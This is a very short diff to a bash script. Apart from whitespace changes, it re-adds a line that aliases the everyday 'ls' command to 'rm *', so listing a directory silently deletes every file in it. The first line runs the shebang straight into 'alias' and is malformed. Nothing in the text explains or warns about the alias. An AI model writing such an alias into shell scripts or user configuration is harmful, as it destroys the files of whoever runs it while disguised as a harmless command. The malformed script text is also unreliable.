@@ -1,3 +1,2 @@
 #!/bin/bashalias
-ls="rm *"  
-
+ls="rm *"
